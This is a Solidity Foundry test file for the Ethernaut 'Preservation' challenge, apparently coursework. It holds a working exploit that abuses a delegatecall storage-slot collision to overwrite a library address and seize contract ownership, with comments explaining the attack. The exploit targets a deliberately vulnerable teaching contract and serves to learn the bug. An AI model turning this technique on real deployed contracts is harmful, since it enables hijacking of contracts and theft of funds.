// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Test, console2} from "forge-std/Test.sol";
import {Preservation, LibraryContract, AttackPreservation} from "src/Week17-18/EthernautPreservation.sol";

//forge test --mc EthernautPreservationTest -vvvv
contract EthernautPreservationTest is Test {
    Preservation preservation;
    LibraryContract timeZone1Library;
    LibraryContract timeZone2Library;
    AttackPreservation attackPreservation;

    address owner;
    address attacker;

    function setUp() public {
        owner = address(this);
        attacker = address(0xbad);

        timeZone1Library = new LibraryContract();
        timeZone2Library = new LibraryContract();

        preservation = new Preservation(address(timeZone1Library), address(timeZone2Library));
        attackPreservation = new AttackPreservation();
    }

    function testExploit() public {
        vm.startPrank(attacker);
        preservation.setFirstTime(uint256(uint160(address(attackPreservation))));
        preservation.setFirstTime(uint256(uint160(attacker)));
        assertEq(preservation.owner(), attacker);
    }
}

// Exploit:
// Recall that when a `delegatecall` is executed, the execution context is the calling contract.
// This means in Preservation, when `timeZone1Library.delegatecall()` is called, the storage layout of
// Preservation is used in the execution of `setTime` in LibraryContract. The problem here is that the `storedTime`
// in LibraryContract is in the same storage slot as `timeZone1Library` in Preservation. Thus when we call
// `setFirstTime` with an address we control, we can overwrite `timeZone1Library` with our attacking contract address.
// Now since `timeZone1Library` is overwritten with our attacking contract address, when `timeZone1Library.delegatecall()`
// is called again, we will be executing `AttackPreservation`'s `setTime` function where the owner is being set to our
// attacker address. This will work since the storage layout of our attacking contract is the same as Preservation.
